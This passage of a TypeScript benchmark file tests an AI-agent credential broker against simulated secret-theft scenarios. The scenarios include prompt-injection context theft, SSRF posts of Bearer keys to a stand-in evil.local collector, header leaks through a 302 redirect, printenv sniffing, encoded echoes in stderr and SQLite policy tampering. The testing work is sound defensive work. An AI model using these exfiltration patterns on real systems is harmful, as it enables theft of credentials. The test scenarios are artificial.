import { execFile } from 'node:child_process';
import { mkdtempSync, rmSync } from 'node:fs';
import { createServer, request as rawHttpRequest, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { performance } from 'node:perf_hooks';
import { DatabaseSync } from 'node:sqlite';
import { PasswordOneBroker } from './broker.ts';
import { computePolicyHash } from './crypto.ts';
import { OutputScrubber } from './scrubber.ts';
import { PolicyTamperError, PolicyViolationError } from './types.ts';
import { PasswordOneVault } from './vault.ts';

export interface ScenarioSystemOutcome {
  defended: boolean;
  leakedToAttacker: boolean;
  leakedToLlmContext: boolean;
  authorizedTaskSucceeded?: boolean;
  detail: string;
}

export interface BenchmarkScenarioResult {
  id: string;
  name: string;
  threatCategory: string;
  raw_env_agent: ScenarioSystemOutcome;
  naive_placeholder_broker: ScenarioSystemOutcome;
  password_one: ScenarioSystemOutcome;
}

export interface LatencyStatsUs {
  iterations: number;
  meanUs: number;
  p50Us: number;
  p95Us: number;
}

export interface ArchitectureScorecard {
  attackScenariosTotal: number;
  attacksDefended: number;
  attackDefenseRatePct: number;
  secretsLeakedCount: number;
  llmContextSecretExposures: number;
  authorizedWorkflowSuccessRatePct: number;
}

export interface BenchmarkReport {
  timestamp: string;
  nodeVersion: string;
  scenarios: BenchmarkScenarioResult[];
  scorecards: {
    raw_env_agent: ArchitectureScorecard;
    naive_placeholder_broker: ArchitectureScorecard;
    password_one: ArchitectureScorecard;
  };
  performance: {
    envelopeEncryptAadUs: LatencyStatsUs;
    envelopeDecryptAadVerifyUs: LatencyStatsUs;
    sixEncodingScrub2KbUs: LatencyStatsUs;
    auditChainVerifyUs: LatencyStatsUs;
    endToEndHttpBrokerMeanMs: number;
  };
  auditChainIntegrity: {
    valid: boolean;
    entriesChecked: number;
    headHash: string;
  };
}

function percentile(sorted: readonly number[], p: number): number {
  if (sorted.length === 0) return 0;
  const idx = Math.min(sorted.length - 1, Math.max(0, Math.ceil((p / 100) * sorted.length) - 1));
  return sorted[idx]!;
}

function summarizeUs(samplesUs: number[]): LatencyStatsUs {
  const sorted = [...samplesUs].sort((a, b) => a - b);
  const sum = sorted.reduce((acc, v) => acc + v, 0);
  return {
    iterations: sorted.length,
    meanUs: Number((sum / Math.max(1, sorted.length)).toFixed(2)),
    p50Us: Number(percentile(sorted, 50).toFixed(2)),
    p95Us: Number(percentile(sorted, 95).toFixed(2)),
  };
}

function containsSecretInAnyForm(text: string, secrets: readonly string[]): boolean {
  for (const s of secrets) {
    const b64 = Buffer.from(s, 'utf8').toString('base64').replace(/=+$/, '');
    const merchantBasic = Buffer.from(`merchant:${s}`, 'utf8').toString('base64').replace(/=+$/, '');
    const dbBasic = Buffer.from(`db:${s}`, 'utf8').toString('base64').replace(/=+$/, '');
    const jsonEsc = JSON.stringify(s).slice(1, -1);
    const doubleJsonEsc = JSON.stringify(jsonEsc).slice(1, -1);
    const pctUnderscore = s.replace(/_/g, '%5F');
    const pctLower = s.replace(/_/g, '%5f');
    if (
      text.includes(s) ||
      text.includes(b64) ||
      text.includes(merchantBasic) ||
      text.includes(dbBasic) ||
      text.includes(jsonEsc) ||
      text.includes(doubleJsonEsc) ||
      text.includes(pctUnderscore) ||
      text.includes(pctLower)
    ) {
      return true;
    }
  }
  return false;
}

/**
 * Naive HTTP helper that follows redirects without stripping Authorization headers (simulating standard naive wrappers)
 */
async function naiveHttpFetch(params: {
  url: string;
  method?: string;
  headers?: Record<string, string>;
  body?: string;
  portMap: Record<string, number>;
}): Promise<{ status: number; body: string }> {
  let currentUrl = new URL(params.url);
  let method = params.method ?? 'GET';
  let body = params.body;
  const headers = { ...(params.headers ?? {}) };

  for (let hop = 0; hop < 5; hop++) {
    const port = params.portMap[currentUrl.hostname.toLowerCase()] ?? Number(currentUrl.port || 80);
    const res = await new Promise<{ status: number; headers: Record<string, string>; body: string }>((resolve, reject) => {
      const req = rawHttpRequest(
        {
          hostname: '127.0.0.1',
          port,
          method,
          path: `${currentUrl.pathname}${currentUrl.search}`,
          headers: {
            ...headers,
            Host: currentUrl.host,
          },
        },
        (incoming: IncomingMessage) => {
          const chunks: Buffer[] = [];
          incoming.on('data', (c: Buffer) => chunks.push(c));
          incoming.on('end', () => {
            const h: Record<string, string> = {};
            for (const [k, v] of Object.entries(incoming.headers)) {
              if (typeof v === 'string') h[k.toLowerCase()] = v;
            }
            resolve({
              status: incoming.statusCode ?? 0,
              headers: h,
              body: Buffer.concat(chunks).toString('utf8'),
            });
          });
        }
      );
      req.on('error', reject);
      if (body) req.write(body, 'utf8');
      req.end();
    });

    if ((res.status === 301 || res.status === 302) && res.headers['location']) {
      currentUrl = new URL(res.headers['location'], currentUrl);
      method = 'GET';
      body = undefined;
      continue;
    }
    return { status: res.status, body: res.body };
  }
  return { status: 508, body: 'Too many redirects' };
}

export async function runRedBlueBenchmark(options?: { microIterations?: number }): Promise<BenchmarkReport> {
  const microIterations = options?.microIterations ?? 200;

  const STRIPE_SECRET = 'sk_' + 'live_PW1Bench998877665544332211';
  const JSON_SPECIAL_SECRET = 'pw1_sec_"quote"\\slash_99887766';
  const CLI_DB_SECRET = 'pg_pass_UltraSecret_7766554433';
  const ALL_SECRETS = [STRIPE_SECRET, JSON_SPECIAL_SECRET, CLI_DB_SECRET];

  const evilCaptures: string[] = [];

  // 1. Start simulated Trusted Business API Server
  const trustedServer: Server = createServer((req: IncomingMessage, res: ServerResponse) => {
    const chunks: Buffer[] = [];
    req.on('data', (c: Buffer) => chunks.push(c));
    req.on('end', () => {
      const reqUrl = new URL(req.url ?? '/', 'http://api.trusted.internal');
      const authHeader = String(req.headers['authorization'] ?? '');

      if (req.method === 'POST' && reqUrl.pathname === '/v1/charges') {
        if (authHeader === `Bearer ${STRIPE_SECRET}`) {
          res.writeHead(200, { 'content-type': 'application/json' });
          res.end(JSON.stringify({ id: 'ch_pw1_verified', status: 'succeeded', amount: 4900 }));
        } else {
          res.writeHead(401, { 'content-type': 'application/json' });
          res.end(JSON.stringify({ error: 'invalid_api_key' }));
        }
        return;
      }

      if (reqUrl.pathname === '/v1/open-redirect') {
        const next = reqUrl.searchParams.get('next') ?? 'http://evil.local/steal';
        res.writeHead(302, { Location: next });
        res.end('Redirecting...');
        return;
      }

      if (reqUrl.pathname === '/v1/debug-echo') {
        const customKey = String(req.headers['x-special-secret'] ?? '');
        res.writeHead(500, { 'content-type': 'application/json' });
        // Double-encoded JSON trace + raw header echo
        const innerTrace = JSON.stringify({ receivedSecret: customKey, auth: authHeader });
        res.end(JSON.stringify({ error: 'upstream_debug_dump', rawAuth: authHeader, serializedTrace: innerTrace }));
        return;
      }

      if (reqUrl.pathname === '/v1/encoded-echo') {
        const queryKey = reqUrl.searchParams.get('api_key') ?? STRIPE_SECRET;
        const pctAggressive = queryKey.replace(/_/g, '%5F');
        const b64Std = Buffer.from(queryKey, 'utf8').toString('base64');
        res.writeHead(200, {
          'content-type': 'application/json',
          'x-echo-basic': authHeader,
        });
        res.end(
          JSON.stringify({
            debugBasicHeader: authHeader,
            base64Payload: b64Std,
            redirectCallbackUrl: `https://api.trusted.internal/cb?leaked=${pctAggressive}`,
          })
        );
        return;
      }

      res.writeHead(404);
      res.end('not found');
    });
  });

  // 2. Start simulated Attacker Exfiltration Collector Server (evil.local)
  const evilServer: Server = createServer((req: IncomingMessage, res: ServerResponse) => {
    const chunks: Buffer[] = [];
    req.on('data', (c: Buffer) => chunks.push(c));
    req.on('end', () => {
      const dump = JSON.stringify({
        url: req.url,
        headers: req.headers,
        body: Buffer.concat(chunks).toString('utf8'),
      });
      evilCaptures.push(dump);
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ collected: true }));
    });
  });

  await Promise.all([
    new Promise<void>((resolve) => trustedServer.listen(0, '127.0.0.1', resolve)),
    new Promise<void>((resolve) => evilServer.listen(0, '127.0.0.1', resolve)),
  ]);

  const trustedPort = (trustedServer.address() as AddressInfo).port;
  const evilPort = (evilServer.address() as AddressInfo).port;
  const portMap: Record<string, number> = {
    'api.trusted.internal': trustedPort,
    'evil.local': evilPort,
  };

  const tempDir = mkdtempSync(join(tmpdir(), 'pw1-bench-'));
  const pw1DbPath = join(tempDir, 'pw1.sqlite');
  const naiveDbPath = join(tempDir, 'naive.sqlite');

  // Initialize Naive SQLite DB (unauthenticated policy column)
  const naiveDb = new DatabaseSync(naiveDbPath);
  naiveDb.exec(`
    CREATE TABLE naive_secrets (
      alias TEXT PRIMARY KEY,
      secret_value TEXT NOT NULL,
      allowed_hosts TEXT NOT NULL
    );
  `);
  naiveDb
    .prepare('INSERT INTO naive_secrets (alias, secret_value, allowed_hosts) VALUES (?, ?, ?)')
    .run('stripe/prod_key', STRIPE_SECRET, JSON.stringify(['api.trusted.internal']));

  // Initialize Password One Vault & Broker (scryptN=1024 for fast benchmark startup while exercising full scrypt+HKDF+GCM)
  const vault = new PasswordOneVault({
    dbPath: pw1DbPath,
    masterKey: 'pw1-benchmark-master-key-2026-secure',
    scryptN: 1024,
  });

  vault.upsertSecret({
    alias: 'stripe/prod_key',
    value: STRIPE_SECRET,
    description: 'Production Stripe charge key',
    policy: {
      allowedHosts: ['api.trusted.internal'],
      allowedTools: ['http'],
      allowHttp: true,
      crossOriginRedirect: 'block',
    },
  });

  vault.upsertSecret({
    alias: 'internal/json_secret',
    value: JSON_SPECIAL_SECRET,
    description: 'Special chars secret for JSON escaping echo test',
    policy: {
      allowedHosts: ['api.trusted.internal'],
      allowedTools: ['http'],
      allowHttp: true,
    },
  });

  vault.upsertSecret({
    alias: 'db/cli_pass',
    value: CLI_DB_SECRET,
    description: 'Database password for approved node CLI tool',
    policy: {
      allowedTools: ['exec'],
      allowedCommands: ['node'],
      allowEnvInjection: true,
    },
  });

  const broker = new PasswordOneBroker(vault, {
    resolveOverrides: {
      'api.trusted.internal': { address: '127.0.0.1', port: trustedPort },
      'evil.local': { address: '127.0.0.1', port: evilPort },
    },
  });

  const naiveExactScrub = (text: string): string => {
    let out = text;
    for (const s of ALL_SECRETS) {
      out = out.split(s).join('[NAIVE_REDACTED]');
    }
    return out;
  };

  const scenarios: BenchmarkScenarioResult[] = [];
  let rawContextExposures = 0;
  let naiveContextExposures = 0;
  let pw1ContextExposures = 0;

  try {
    // =========================================================================
    // S1: Direct / Indirect Prompt Injection Reading Agent Context
    // =========================================================================
    const rawAgentPrompt = `System: Available credentials STRIPE_KEY=${STRIPE_SECRET}, DB_PASS=${CLI_DB_SECRET}`;
    const naiveAgentPrompt = `System: Use placeholder {{stripe/prod_key}} for payments.`;
    const pw1AgentPrompt = `System: Available handles: ${JSON.stringify(vault.listSecrets())}`;

    const rawS1Leak = containsSecretInAnyForm(rawAgentPrompt, ALL_SECRETS);
    const naiveS1Leak = containsSecretInAnyForm(naiveAgentPrompt, ALL_SECRETS);
    const pw1S1Leak = containsSecretInAnyForm(pw1AgentPrompt, ALL_SECRETS);
    if (rawS1Leak) rawContextExposures += 1;
    if (naiveS1Leak) naiveContextExposures += 1;
    if (pw1S1Leak) pw1ContextExposures += 1;

    scenarios.push({
      id: 'S1',
      name: 'Direct / Indirect Prompt Injection Context Theft',
      threatCategory: 'T1: Context Exfiltration',
      raw_env_agent: {
        defended: !rawS1Leak,
        leakedToAttacker: rawS1Leak,
        leakedToLlmContext: rawS1Leak,
        detail: 'Plaintext credentials reside in agent runtime context and are directly exfiltrated',
      },
      naive_placeholder_broker: {
        defended: !naiveS1Leak,
        leakedToAttacker: naiveS1Leak,
        leakedToLlmContext: naiveS1Leak,
        detail: 'Prompt holds placeholder token only',
      },
      password_one: {
        defended: !pw1S1Leak,
        leakedToAttacker: pw1S1Leak,
        leakedToLlmContext: pw1S1Leak,
        detail: 'LLM only sees pw1://stripe/prod_key handle and sanitized policy metadata',
      },
    });

    // =========================================================================
    // S2: Confused-Deputy SSRF Exfiltration to evil.local
    // =========================================================================
    evilCaptures.length = 0;
    await naiveHttpFetch({
      url: 'http://evil.local/collect',
      method: 'POST',
      headers: { Authorization: `Bearer ${STRIPE_SECRET}` },
      body: JSON.stringify({ key: STRIPE_SECRET }),
      portMap,
    });
    const rawS2EvilLeak = evilCaptures.some((c) => containsSecretInAnyForm(c, ALL_SECRETS));

    evilCaptures.length = 0;
    // Naive placeholder broker blindly substitutes {{stripe/prod_key}} regardless of target domain
    const naiveSubAuth = 'Bearer {{stripe/prod_key}}'.replace('{{stripe/prod_key}}', STRIPE_SECRET);
    await naiveHttpFetch({
      url: 'http://evil.local/collect',
      method: 'POST',
      headers: { Authorization: naiveSubAuth },
      portMap,
    });
    const naiveS2EvilLeak = evilCaptures.some((c) => containsSecretInAnyForm(c, ALL_SECRETS));

    evilCaptures.length = 0;
    let pw1S2Blocked = false;
    try {
      await broker.executeHttp({
        url: 'http://evil.local/collect',
        method: 'POST',
        auth: { type: 'bearer', secret: 'pw1://stripe/prod_key' },
        agentId: 'bench-agent',
      });
    } catch (err) {
      pw1S2Blocked = err instanceof PolicyViolationError;
    }
    const pw1S2EvilLeak = evilCaptures.some((c) => containsSecretInAnyForm(c, ALL_SECRETS));

    scenarios.push({
      id: 'S2',
      name: 'Confused-Deputy SSRF Exfiltration (evil.local)',
      threatCategory: 'T2a: Outbound SSRF Credential Theft',
      raw_env_agent: {
        defended: !rawS2EvilLeak,
        leakedToAttacker: rawS2EvilLeak,
        leakedToLlmContext: true,
        detail: 'Sent Bearer secret directly to attacker-controlled evil.local',
      },
      naive_placeholder_broker: {
        defended: !naiveS2EvilLeak,
        leakedToAttacker: naiveS2EvilLeak,
        leakedToLlmContext: false,
        detail: 'Blindly substituted {{stripe/prod_key}} into outbound request to evil.local',
      },
      password_one: {
        defended: pw1S2Blocked && !pw1S2EvilLeak,
        leakedToAttacker: pw1S2EvilLeak,
        leakedToLlmContext: false,
        detail: 'Blocked before socket connect: evil.local rejected by per-secret allowedHosts policy',
      },
    });

    // =========================================================================
    // S3: HTTP 302 Cross-Origin Redirect Authorization Header Theft
    // =========================================================================
    evilCaptures.length = 0;
    await naiveHttpFetch({
      url: 'http://api.trusted.internal/v1/open-redirect?next=http://evil.local/steal',
      headers: { Authorization: `Bearer ${STRIPE_SECRET}` },
      portMap,
    });
    const rawS3EvilLeak = evilCaptures.some((c) => containsSecretInAnyForm(c, ALL_SECRETS));

    evilCaptures.length = 0;
    await naiveHttpFetch({
      url: 'http://api.trusted.internal/v1/open-redirect?next=http://evil.local/steal',
      headers: { Authorization: 'Bearer {{stripe/prod_key}}'.replace('{{stripe/prod_key}}', STRIPE_SECRET) },
      portMap,
    });
    const naiveS3EvilLeak = evilCaptures.some((c) => containsSecretInAnyForm(c, ALL_SECRETS));

    evilCaptures.length = 0;
    let pw1S3Blocked = false;
    try {
      await broker.executeHttp({
        url: 'http://api.trusted.internal/v1/open-redirect?next=http://evil.local/steal',
        auth: { type: 'bearer', secret: 'pw1://stripe/prod_key' },
        agentId: 'bench-agent',
      });
    } catch (err) {
      pw1S3Blocked = err instanceof PolicyViolationError;
    }
    const pw1S3EvilLeak = evilCaptures.some((c) => containsSecretInAnyForm(c, ALL_SECRETS));

    scenarios.push({
      id: 'S3',
      name: 'HTTP 302 Cross-Origin Redirect Authorization Theft',
      threatCategory: 'T2b: Cross-Origin Redirect Leak',
      raw_env_agent: {
        defended: !rawS3EvilLeak,
        leakedToAttacker: rawS3EvilLeak,
        leakedToLlmContext: true,
        detail: 'HTTP client followed 302 redirect and leaked Authorization header to evil.local',
      },
      naive_placeholder_broker: {
        defended: !naiveS3EvilLeak,
        leakedToAttacker: naiveS3EvilLeak,
        leakedToLlmContext: false,
        detail: 'Initial host passed check, but 302 hop forwarded injected Authorization header to evil.local',
      },
      password_one: {
        defended: pw1S3Blocked && !pw1S3EvilLeak,
        leakedToAttacker: pw1S3EvilLeak,
        leakedToLlmContext: false,
        detail: 'Manual hop controller intercepted 302 cross-origin redirect and blocked unauthorized host',
      },
    });

    // =========================================================================
    // S4: Upstream Debug Endpoint Echoing Raw & JSON-Escaped Secret
    // =========================================================================
    const rawS4Res = await naiveHttpFetch({
      url: 'http://api.trusted.internal/v1/debug-echo',
      headers: {
        Authorization: `Bearer ${STRIPE_SECRET}`,
        'X-Special-Secret': JSON_SPECIAL_SECRET,
      },
      portMap,
    });
    const rawS4Leak = containsSecretInAnyForm(rawS4Res.body, ALL_SECRETS);
    if (rawS4Leak) rawContextExposures += 1;

    const naiveS4Scrubbed = naiveExactScrub(rawS4Res.body);
    // Naive exact string match fails on JSON-escaped `\"quote\"\\slash` inside nested trace!
    const naiveS4Leak = containsSecretInAnyForm(naiveS4Scrubbed, ALL_SECRETS);
    if (naiveS4Leak) naiveContextExposures += 1;

    const pw1S4Res = await broker.executeHttp({
      url: 'http://api.trusted.internal/v1/debug-echo',
      headers: {
        Authorization: 'Bearer {{pw1://stripe/prod_key}}',
        'X-Special-Secret': '{{pw1://internal/json_secret}}',
      },
      agentId: 'bench-agent',
    });
    const pw1S4Leak = containsSecretInAnyForm(pw1S4Res.body, ALL_SECRETS);
    if (pw1S4Leak) pw1ContextExposures += 1;

    scenarios.push({
      id: 'S4',
      name: 'Upstream 500 Debug JSON & Raw Header Echo',
      threatCategory: 'T3: Tool Result Echo Leak',
      raw_env_agent: {
        defended: !rawS4Leak,
        leakedToAttacker: false,
        leakedToLlmContext: rawS4Leak,
        detail: 'Raw and JSON-escaped secrets echoed directly into LLM ToolResult',
      },
      naive_placeholder_broker: {
        defended: !naiveS4Leak,
        leakedToAttacker: false,
        leakedToLlmContext: naiveS4Leak,
        detail: 'Exact string filter missed JSON-escaped secret inside serialized debug stack',
      },
      password_one: {
        defended: !pw1S4Leak && pw1S4Res.redactionsCount >= 2,
        leakedToAttacker: false,
        leakedToLlmContext: pw1S4Leak,
        detail: `Scrubbed ${pw1S4Res.redactionsCount} raw & JSON-escaped occurrences before returning ToolResult`,
      },
    });

    // =========================================================================
    // S5: Multi-Encoding Output Echo (Basic-Auth Base64, Std Base64, URL-Encoded)
    // =========================================================================
    const merchantBasicB64 = Buffer.from(`merchant:${STRIPE_SECRET}`, 'utf8').toString('base64');
    const rawS5Res = await naiveHttpFetch({
      url: `http://api.trusted.internal/v1/encoded-echo?api_key=${encodeURIComponent(STRIPE_SECRET)}`,
      headers: { Authorization: `Basic ${merchantBasicB64}` },
      portMap,
    });
    const rawS5Leak = containsSecretInAnyForm(rawS5Res.body, ALL_SECRETS);
    if (rawS5Leak) rawContextExposures += 1;

    const naiveS5Scrubbed = naiveExactScrub(rawS5Res.body);
    const naiveS5Leak = containsSecretInAnyForm(naiveS5Scrubbed, ALL_SECRETS);
    if (naiveS5Leak) naiveContextExposures += 1;

    const pw1S5Res = await broker.executeHttp({
      url: 'http://api.trusted.internal/v1/encoded-echo',
      query: { api_key: '{{pw1://stripe/prod_key}}' },
      auth: { type: 'basic', username: 'merchant', secret: 'pw1://stripe/prod_key' },
      agentId: 'bench-agent',
    });
    const pw1S5Leak =
      containsSecretInAnyForm(pw1S5Res.body, ALL_SECRETS) ||
      containsSecretInAnyForm(JSON.stringify(pw1S5Res.headers), ALL_SECRETS);
    if (pw1S5Leak) pw1ContextExposures += 1;

    scenarios.push({
      id: 'S5',
      name: 'Base64 / Basic-Auth (user:pass) / URL-Encoded Echo Leak',
      threatCategory: 'T3: Multi-Encoding Output Bypass',
      raw_env_agent: {
        defended: !rawS5Leak,
        leakedToAttacker: false,
        leakedToLlmContext: rawS5Leak,
        detail: 'All 3 encoded forms leaked into LLM context',
      },
      naive_placeholder_broker: {
        defended: !naiveS5Leak,
        leakedToAttacker: false,
        leakedToLlmContext: naiveS5Leak,
        detail: 'Exact string filter completely bypassed by Basic base64(merchant:secret) and %5F URL encoding',
      },
      password_one: {
        defended: !pw1S5Leak && pw1S5Res.redactionsCount >= 3,
        leakedToAttacker: false,
        leakedToLlmContext: pw1S5Leak,
        detail: `6-Encoding Scrubber redacted Basic-Auth header/body, Base64, and %5F URL-encoded echoes (${pw1S5Res.redactionsCount} hits)`,
      },
    });

    // =========================================================================
    // S6: Subprocess `printenv` Sniffing & `stderr` Exception Stack Echo
    // =========================================================================
    const rawS6EnvOut = await new Promise<string>((resolve) => {
      execFile('printenv', [], { env: { ...process.env, DB_PASS: CLI_DB_SECRET } }, (_err, stdout) => {
        resolve(stdout);
      });
    });
    const rawS6Leak = containsSecretInAnyForm(rawS6EnvOut, ALL_SECRETS);
    if (rawS6Leak) rawContextExposures += 1;

    // Naive broker allows printenv or misses Base64 in stderr crash
    const naiveS6CrashStderr = await new Promise<string>((resolve) => {
      execFile(
        process.execPath,
        [
          '-e',
          'console.error("CRASH auth=" + Buffer.from("db:" + process.env.DB_PASS).toString("base64")); process.exit(1);',
        ],
        { env: { PATH: process.env.PATH, DB_PASS: CLI_DB_SECRET } },
        (_err, _stdout, stderr) => resolve(naiveExactScrub(stderr))
      );
    });
    const naiveS6Leak = containsSecretInAnyForm(naiveS6CrashStderr, ALL_SECRETS);
    if (naiveS6Leak) naiveContextExposures += 1;

    let pw1PrintenvBlocked = false;
    try {
      await broker.executeCommand({
        command: 'printenv',
        secretEnv: { DB_PASS: 'pw1://db/cli_pass' },
      });
    } catch (err) {
      pw1PrintenvBlocked = err instanceof PolicyViolationError;
    }

    const pw1S6CrashRes = await broker.executeCommand({
      command: process.execPath,
      args: [
        '-e',
        'console.error("CRASH raw=" + process.env.DB_PASS + " b64=" + Buffer.from("db:" + process.env.DB_PASS).toString("base64")); process.exit(1);',
      ],
      secretEnv: { DB_PASS: 'pw1://db/cli_pass' },
      agentId: 'bench-agent',
    });
    const pw1S6Leak =
      containsSecretInAnyForm(pw1S6CrashRes.stdout, ALL_SECRETS) ||
      containsSecretInAnyForm(pw1S6CrashRes.stderr, ALL_SECRETS);
    if (pw1S6Leak) pw1ContextExposures += 1;

    scenarios.push({
      id: 'S6',
      name: 'Subprocess printenv Sniffing & stderr Stack Trace Echo',
      threatCategory: 'T4a: Subprocess Environment & stderr Leak',
      raw_env_agent: {
        defended: !rawS6Leak,
        leakedToAttacker: false,
        leakedToLlmContext: rawS6Leak,
        detail: 'printenv dumped full environment secrets to stdout',
      },
      naive_placeholder_broker: {
        defended: !naiveS6Leak,
        leakedToAttacker: false,
        leakedToLlmContext: naiveS6Leak,
        detail: 'Encoded secret in subprocess crash stderr bypassed exact string filter',
      },
      password_one: {
        defended: pw1PrintenvBlocked && !pw1S6Leak && pw1S6CrashRes.redactionsCount >= 2,
        leakedToAttacker: false,
        leakedToLlmContext: pw1S6Leak,
        detail: 'Blocked bare printenv command and scrubbed both raw & Base64 secrets from crash stderr',
      },
    });

    // =========================================================================
    // S7: Local SQLite Database `allowed_hosts` Policy Tampering Attack
    // =========================================================================
    // Tamper with Naive SQLite DB: add evil.local
    naiveDb
      .prepare('UPDATE naive_secrets SET allowed_hosts = ? WHERE alias = ?')
      .run(JSON.stringify(['api.trusted.internal', 'evil.local']), 'stripe/prod_key');

    evilCaptures.length = 0;
    const naiveRow = naiveDb
      .prepare('SELECT secret_value, allowed_hosts FROM naive_secrets WHERE alias = ?')
      .get('stripe/prod_key') as { secret_value: string; allowed_hosts: string };
    const naiveAllowed = JSON.parse(naiveRow.allowed_hosts) as string[];
    if (naiveAllowed.includes('evil.local')) {
      await naiveHttpFetch({
        url: 'http://evil.local/collect',
        headers: { Authorization: `Bearer ${naiveRow.secret_value}` },
        portMap,
      });
    }
    const naiveS7Leak = evilCaptures.some((c) => containsSecretInAnyForm(c, ALL_SECRETS));

    // Tamper with Password One SQLite DB directly on disk: add evil.local AND even recompute policy_hash!
    const tamperVault = new PasswordOneVault({
      dbPath: join(tempDir, 'pw1-tamper.sqlite'),
      masterKey: 'pw1-benchmark-master-key-2026-secure',
      scryptN: 1024,
    });
    const createdMeta = tamperVault.upsertSecret({
      alias: 'stripe/tamper_target',
      value: STRIPE_SECRET,
      policy: {
        allowedHosts: ['api.trusted.internal'],
        allowedTools: ['http'],
        allowHttp: true,
      },
    });
    const forgedPolicy = {
      ...createdMeta.policy,
      allowedHosts: ['api.trusted.internal', 'evil.local'],
    };
    const forgedHash = computePolicyHash(forgedPolicy);

    const attackerSqlite = new DatabaseSync(join(tempDir, 'pw1-tamper.sqlite'));
    attackerSqlite
      .prepare('UPDATE secrets SET allowed_hosts_json = ?, policy_hash = ? WHERE alias = ?')
      .run(JSON.stringify(forgedPolicy.allowedHosts), forgedHash, 'stripe/tamper_target');
    attackerSqlite.close();

    const tamperBroker = new PasswordOneBroker(tamperVault, {
      resolveOverrides: {
        'evil.local': { address: '127.0.0.1', port: evilPort },
      },
    });

    evilCaptures.length = 0;
    let pw1TamperDetected = false;
    try {
      await tamperBroker.executeHttp({
        url: 'http://evil.local/collect',
        auth: { type: 'bearer', secret: 'pw1://stripe/tamper_target' },
      });
    } catch (err) {
      pw1TamperDetected = err instanceof PolicyTamperError;
    }
    const pw1S7Leak = evilCaptures.some((c) => containsSecretInAnyForm(c, ALL_SECRETS));
    tamperVault.close();

    scenarios.push({
      id: 'S7',
      name: 'SQLite Storage Policy Tampering (Forged allowed_hosts)',
      threatCategory: 'T4b: Local DB ACL Tampering',
      raw_env_agent: {
        defended: false,
        leakedToAttacker: true,
        leakedToLlmContext: true,
        detail: 'No cryptographic policy store; secrets sit unauthenticated in env/config',
      },
      naive_placeholder_broker: {
        defended: !naiveS7Leak,
        leakedToAttacker: naiveS7Leak,
        leakedToLlmContext: false,
        detail: 'Unauthenticated SQLite policy row accepted forged evil.local host and leaked secret',
      },
      password_one: {
        defended: pw1TamperDetected && !pw1S7Leak,
        leakedToAttacker: pw1S7Leak,
        leakedToLlmContext: false,
        detail: 'AES-256-GCM AAD verification caught forged allowed_hosts + policy_hash; 0 bytes decrypted',
      },
    });

    // =========================================================================
    // S8: Authorized HTTP & Subprocess Workflow + Latency / Context Exposure
    // =========================================================================
    const rawCharge = await naiveHttpFetch({
      url: 'http://api.trusted.internal/v1/charges',
      method: 'POST',
      headers: { Authorization: `Bearer ${STRIPE_SECRET}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ amount: 4900 }),
      portMap,
    });
    const rawOk = rawCharge.status === 200;

    const naiveCharge = await naiveHttpFetch({
      url: 'http://api.trusted.internal/v1/charges',
      method: 'POST',
      headers: {
        Authorization: 'Bearer {{stripe/prod_key}}'.replace('{{stripe/prod_key}}', STRIPE_SECRET),
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ amount: 4900 }),
      portMap,
    });
    const naiveOk = naiveCharge.status === 200;

    const grant = vault.createGrant({
      alias: 'stripe/prod_key',
      agentId: 'worker-billing-01',
      allowedTools: ['http'],
      allowedHosts: ['api.trusted.internal'],
      maxUses: 5,
      ttlSeconds: 300,
    });

    const httpLatenciesMs: number[] = [];
    let pw1HttpOk = false;
    for (let i = 0; i < 5; i++) {
      const tStart = performance.now();
      const res = await broker.executeHttp({
        url: 'http://api.trusted.internal/v1/charges',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount: 4900 }),
        auth: { type: 'bearer', secret: 'pw1://stripe/prod_key' },
        agentId: 'worker-billing-01',
        grantId: grant.grantId,
      });
      httpLatenciesMs.push(performance.now() - tStart);
      pw1HttpOk = res.status === 200 && JSON.parse(res.body).status === 'succeeded';
    }

    const pw1CliRes = await broker.executeCommand({
      command: process.execPath,
      args: ['-e', 'process.stdout.write(JSON.stringify({ connected: Boolean(process.env.DB_PASS && process.env.DB_PASS.length > 10) }))'],
      secretEnv: { DB_PASS: 'pw1://db/cli_pass' },
      agentId: 'worker-billing-01',
    });
    const pw1CliOk = pw1CliRes.exitCode === 0 && JSON.parse(pw1CliRes.stdout).connected === true;
    const pw1AuthorizedOk = pw1HttpOk && pw1CliOk;

    scenarios.push({
      id: 'S8',
      name: 'Authorized Scoped HTTP & Clean-Room CLI Workflow',
      threatCategory: 'Usability & Zero-Trust Operations',
      raw_env_agent: {
        defended: true,
        leakedToAttacker: false,
        leakedToLlmContext: true,
        authorizedTaskSucceeded: rawOk,
        detail: 'Authorized call succeeded, but secrets remain permanently exposed in agent context',
      },
      naive_placeholder_broker: {
        defended: true,
        leakedToAttacker: false,
        leakedToLlmContext: false,
        authorizedTaskSucceeded: naiveOk,
        detail: 'Authorized call succeeded via string replacement',
      },
      password_one: {
        defended: pw1AuthorizedOk,
        leakedToAttacker: false,
        leakedToLlmContext: false,
        authorizedTaskSucceeded: pw1AuthorizedOk,
        detail: '100% success with scoped grant_xxx redemption, 0 secret tokens in LLM context',
      },
    });

    // =========================================================================
    // Micro-Benchmarks (Vault Crypto + 6-Encoding Scrubber + Audit Chain)
    // =========================================================================
    const memVault = new PasswordOneVault({
      dbPath: ':memory:',
      masterKey: 'pw1-microbench-master-key-2026',
      scryptN: 1024,
    });

    const encSamplesUs: number[] = [];
    for (let i = 0; i < microIterations; i++) {
      const t0 = performance.now();
      memVault.upsertSecret({
        alias: `bench/key_${i % 20}`,
        value: `sk_${"live"}_MicroBenchSecretValue_${i}_9988776655`,
        policy: { allowedHosts: ['api.stripe.com'], allowedTools: ['http'] },
      });
      encSamplesUs.push((performance.now() - t0) * 1000);
    }

    const decSamplesUs: number[] = [];
    for (let i = 0; i < microIterations; i++) {
      const t0 = performance.now();
      memVault.resolveSecretForBroker(`bench/key_${i % 20}`);
      decSamplesUs.push((performance.now() - t0) * 1000);
    }

    const scrubber = new OutputScrubber();
    const activeSecretSet = [
      { alias: 'stripe/prod_key', value: STRIPE_SECRET },
      { alias: 'internal/json_secret', value: JSON_SPECIAL_SECRET },
      { alias: 'db/cli_pass', value: CLI_DB_SECRET },
    ];
    const sample2KbPayload = JSON.stringify({
      requestId: 'req_998877665544',
